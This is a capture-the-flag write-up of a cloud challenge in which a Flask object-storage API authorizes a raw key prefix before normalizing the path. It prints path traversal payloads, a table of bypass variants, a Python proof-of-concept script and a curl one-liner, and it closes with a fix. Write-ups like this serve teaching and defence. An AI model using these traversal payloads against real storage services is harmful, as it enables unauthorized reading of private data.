# Harbor Lights — Safcom CTF (Cloud, 300 pts)

**Target:** `http://54.72.82.22:8390`
**Category:** Cloud
**Flag:** `safctf{0a7fe9c5e49d7fbe62cea634195d0adf}`

---

## 1. TL;DR

The challenge exposes a small object-storage web service ("collection desk"). The
public file `storage.json` leaks the name of a private object, `finance/final.txt`,
which the API refuses to serve (`403`).

The authorization check on `GET /api/object?key=...` is a **raw-string prefix test**
(`key.startswith("public/")`), while the actual object lookup applies
**`os.path.normpath()` afterwards**. This check-then-normalize ordering means a
payload that *starts with* `public/` but *normalizes out of* that prefix passes the
ACL:

```
key = public/../finance/final.txt
```

Result:

```json
{"body":"safctf{0a7fe9c5e49d7fbe62cea634195d0adf}"}
```

---

## 2. Reconnaissance

### 2.1 Fingerprint

```
$ curl -i http://54.72.82.22:8390/
HTTP/1.1 200 OK
Server: Werkzeug/3.1.9 Python/3.11.16
Content-Type: text/html; charset=utf-8
Content-Length: 3939
```

The `Server` header identifies a **Flask (Werkzeug dev server) / Python 3.11** stack —
no CDN, no reverse proxy, app served directly. Everything below is app-level logic.

### 2.2 The landing page

The page presents itself as a "collection desk" with two panels:

| Panel | What it does |
|---|---|
| **Collection desk** | Links `storage.json` and documents two API routes |
| **Desk console** | A browser form that replays arbitrary `GET`/`POST`/`PATCH` requests to a *local service path* |

The documented API (from the page's `<details>` block):

```
GET /api/objects            -> lists public object keys
GET /api/object?key=...     -> retrieves an object
```

The console's JavaScript is **client-side only** — it does
`fetch(path, ...)` against the same origin, with a guard that the path must start
with `/` and not `//`. It is a convenience REPL, **not** a server-side proxy, so it
is not an SSRF primitive. It only tells us the app also accepts `PATCH` and `POST`.

```js
if(!path.startsWith('/')||path.startsWith('//')) throw Error('Use a local service path.');
```

### 2.3 Collecting the materials

```
$ curl -s http://54.72.82.22:8390/downloads/storage.json
{
  "scope": "public/*",
  "inventory": [
    "public/lineup.txt",
    "public/receipts.json",
    "finance/final.txt"
  ],
  "adapter": "edge-store/4"
}
```

**This is the information leak that drives the whole challenge.** The declared
`scope` is `public/*`, yet the `inventory` array — which is served publicly — also
contains `finance/final.txt`, a key *outside* the public scope. We now know the exact
name of the object we want.

The public listing confirms only two keys are exposed to us:

```
$ curl -s http://54.72.82.22:8390/api/objects
{"keys":["public/lineup.txt","public/receipts.json"]}
```

### 2.4 Confirming the access control

```
GET /api/object?key=public/lineup.txt      -> 200 {"body":"The next performance begins at eight."}
GET /api/object?key=public/receipts.json   -> 200 {"body":"The next performance begins at eight."}
GET /api/object?key=finance/final.txt      -> 403 {"message":"The request could not be completed.","ok":false}
```

Two notes:

* Both public keys return the **same** body. `receipts.json` returning prose rather
  than JSON marks that string as the store's **fallback/decoy value** for keys that
  resolve but carry no real content. That decoy becomes useful later as a
  "miss" oracle.
* Accessing `finance/final.txt` directly is correctly denied with `403`.

### 2.5 Route enumeration

| Path | Result |
|---|---|
| `/health` | `200 {"status":"ok"}` |
| `/api/objects` | `200` key listing |
| `/api/object` | `403` / `200` object read |
| `/submit` | `405` on GET → **exists, POST-only** |
| `/api/*` (unknown) | `404 {"message":"Not found"}` (JSON catch-all) |
| `/admin`, `/config`, `/robots.txt`, `/proxy`, `/api/fetch` | `404` |

`OPTIONS /api/object` advertises `Allow: GET, OPTIONS, HEAD, PATCH, POST`.

`/submit` looked promising, but a sweep of bodies and content types returned `403`
for everything — it is a decoy endpoint:

```
403 application/json                        {"message":"The request could not be completed.","ok":false}
403 text/plain                              {"message":"The request could not be completed.","ok":false}
403 application/x-www-form-urlencoded       {"message":"The request could not be completed.","ok":false}
```

So the only viable path is the `key` parameter itself.

---

## 3. The vulnerability

The `403` on `finance/final.txt` tells us a scope check exists. The declared scope in
`storage.json` is written as a **glob** — `"public/*"` — but implementations almost
always collapse that to a **string prefix** check:

```python
# vulnerable shape
if not key.startswith("public/"):          # (1) authorize the RAW key
    return 403
path = os.path.normpath(key)               # (2) resolve the NORMALIZED key
return store.read(path)
```

The flaw is the **ordering**: authorization is decided on the *un-normalized* string,
but the object that is actually read is derived from the *normalized* string. Any
input whose raw form begins with `public/` but whose normalized form escapes it is
authorized and then resolved outside the sandbox.

Classic payload:

```
public/../finance/final.txt
```

* starts with `public/` → passes step (1) ✅
* `normpath` → `finance/final.txt` → reads the private object ✅

This is the cloud-storage analogue of path traversal: an **ACL prefix bypass via
check-then-normalize**. In real object stores this class shows up whenever a
`prefix`/`scope` policy is evaluated before key canonicalization (S3 `s3:prefix`
conditions, GCS IAM conditions, Azure SAS `sp`+`sr` scoping, or any hand-rolled
gateway in front of them).

---

## 4. Exploitation

### 4.1 The winning request

```
GET /api/object?key=public%2F..%2Ffinance%2Ffinal.txt HTTP/1.1
Host: 54.72.82.22:8390
```

```
HTTP/1.1 200 OK
{"body":"safctf{0a7fe9c5e49d7fbe62cea634195d0adf}"}
```

### 4.2 Resolver behaviour (empirically characterized)

To write an accurate writeup I mapped the resolver rather than trusting the first hit.
The decoy body `"The next performance begins at eight."` acts as a reliable **miss**
signal.

| `key` | Normalizes to | Result |
|---|---|---|
| `public/lineup.txt` | `public/lineup.txt` | decoy (in scope) |
| `public/../finance/final.txt` | `finance/final.txt` | **FLAG** |
| `public/.././finance/final.txt` | `finance/final.txt` | **FLAG** |
| `public/../finance/../finance/final.txt` | `finance/final.txt` | **FLAG** |
| `public/../public/../finance/final.txt` | `finance/final.txt` | **FLAG** |
| `public/a/../../finance/final.txt` | `finance/final.txt` | **FLAG** |
| `public/%2e%2e/finance/final.txt` | `finance/final.txt` | **FLAG** (single URL-decode) |
| `public/../finance/final.txt/` | `finance/final.txt` | **FLAG** (trailing `/` ignored) |
| `public/../../finance/final.txt` | `../finance/final.txt` | decoy — escapes root, miss |
| `public/..//../finance/final.txt` | `../finance/final.txt` | decoy — escapes root, miss |
| `public/%2e%2e/%2e%2e/finance/final.txt` | `../finance/final.txt` | decoy — over-traversal |
| `public/..%2f..%2ffinance/final.txt` | `../finance/final.txt` | decoy — over-traversal |
| `public/....//finance/final.txt` | `..../finance/final.txt` | decoy — no real key |
| `PUBLIC/../finance/final.txt` | — | `403` — check is case-sensitive |
| `./public/../finance/final.txt` | — | `403` — fails prefix check |
| `public\..\finance\final.txt` | — | `403` — backslashes not separators |
| `finance/final.txt` | — | `403` — correct denial |

**Inferences:**

1. The key is **URL-decoded once** (`%2e%2e` works) but not recursively
   (double-encoding fails, because it over-traverses after one decode).
2. Resolution is **exactly `os.path.normpath` semantics**: one `..` pops one
   component; traversal is clamped only by the store root, not by the ACL.
3. Normalization happens **after** the ACL test — the single root cause.
4. The scope test is a plain, **case-sensitive, non-canonicalizing**
   `startswith("public/")`.

---

## 5. Proof-of-concept

Self-contained, stdlib only (`solve.py`):

```python
#!/usr/bin/env python3
"""Harbor Lights (Safcom CTF, cloud) — object-store ACL bypass via check-then-normalize."""
import urllib.request, urllib.parse, urllib.error, json, re, sys

BASE = "http://54.72.82.22:8390"

def get(path):
    try:
        with urllib.request.urlopen(BASE + path, timeout=15) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")

def main():
    # 1. Leak the private key name from the public inventory.
    _, body = get("/downloads/storage.json")
    inv = json.loads(body)
    print("[*] declared scope :", inv["scope"])
    print("[*] inventory      :", ", ".join(inv["inventory"]))

    private = [k for k in inv["inventory"] if not k.startswith("public/")][0]
    print(f"[*] private key    : {private}")

    # 2. Confirm it is denied directly.
    status, _ = get("/api/object?key=" + urllib.parse.quote(private, safe=""))
    print(f"[*] direct read    : HTTP {status} (expected 403)")

    # 3. Bypass: raw form passes the public/ prefix check, normpath escapes it.
    payload = "public/../" + private
    status, body = get("/api/object?key=" + urllib.parse.quote(payload, safe=""))
    print(f"[*] bypass payload : {payload}  -> HTTP {status}")

    flag = re.search(r"safctf\{[^}]+\}", body)
    if flag:
        print(f"\n[+] FLAG: {flag.group(0)}")
        return 0
    print("\n[-] no flag; response:", body[:300])
    return 1

if __name__ == "__main__":
    sys.exit(main())
```

Output:

```
[*] declared scope : public/*
[*] inventory      : public/lineup.txt, public/receipts.json, finance/final.txt
[*] private key    : finance/final.txt
[*] direct read    : HTTP 403 (expected 403)
[*] bypass payload : public/../finance/final.txt  -> HTTP 200

[+] FLAG: safctf{0a7fe9c5e49d7fbe62cea634195d0adf}
```

One-liner equivalent:

```bash
curl -s 'http://54.72.82.22:8390/api/object?key=public%2F..%2Ffinance%2Ffinal.txt'
# {"body":"safctf{0a7fe9c5e49d7fbe62cea634195d0adf}"}
```

---

## 6. Attack chain summary

```
 http://54.72.82.22:8390/
        │
        ├─ (1) INFO LEAK   GET /downloads/storage.json
        │        scope "public/*" but inventory discloses  finance/final.txt
        │
        ├─ (2) ENUMERATE   GET /api/objects            -> 2 public keys
        │        GET /api/object?key=finance/final.txt -> 403  (control works)
        │
        ├─ (3) ACL BYPASS  GET /api/object?key=public/../finance/final.txt
        │        raw key  starts with "public/"  -> passes startswith() check
        │        normpath -> "finance/final.txt" -> reads out-of-scope object
        │
        └─ (4) FLAG        safctf{0a7fe9c5e49d7fbe62cea634195d0adf}
```

**Root cause:** authorization evaluated on the raw key, object resolution performed on
the normalized key — a check-then-normalize TOCTOU of the input string.

**Fix:** canonicalize first, then authorize — and enforce the boundary with a
separator-aware comparison:

```python
import os

def resolve(key: str) -> str | None:
    key = urllib.parse.unquote(key)                 # decode once, explicitly
    key = key.lstrip("/")
    if "\x00" in key or "\\" in key:
        return None
    norm = os.path.normpath(key)                    # canonicalize FIRST
    if norm.startswith("..") or os.path.isabs(norm):
        return None                                 # don't let it escape the root
    if norm != "public" and not norm.startswith("public" + os.sep):
        return None                                 # authorize the CANONICAL key
    return norm
```

Never compare untrusted paths with `startswith("dir/")` on an un-normalized string;
compare path components (e.g. `pathlib.PurePosixPath(norm).parts[0] == "public"`)
after canonicalization.

---

## 7. Notes / dead ends

* **Desk console is not SSRF.** The `fetch()` lives in browser JS with a
  client-side `/`-prefix guard; no server-side URL fetching exists. No metadata
  endpoint (`169.254.169.254`) is reachable through this app — the "cloud" theme is
  the *storage-policy* flavour, not IMDS.
* **`/submit` is a decoy.** POST-only (405 on GET) and unconditionally 403 across
  JSON, text/plain and form encodings.
* **`public/receipts.json` is a decoy.** Advertised by `/api/objects` but returns the
  generic fallback string rather than JSON.
* **No S3/GCS/Harbor-registry service is actually present.** Despite the "Harbor"
  name (and the CNCF Harbor registry's known history), this is a purpose-built Flask
  store; the intended lesson is the scope-prefix bypass.

## 8. Tooling

* Manual HTTP via Python `urllib` (stdlib) — see `solve.py`.
* Fingerprint from the `Server` header (`Werkzeug/3.1.9 Python/3.11.16`).
* BlackBook (knowledge MCP) used for technique grounding and to record the case;
  HexStrike was used for fingerprinting. Both are optional — the whole challenge is
  solvable with `curl`.
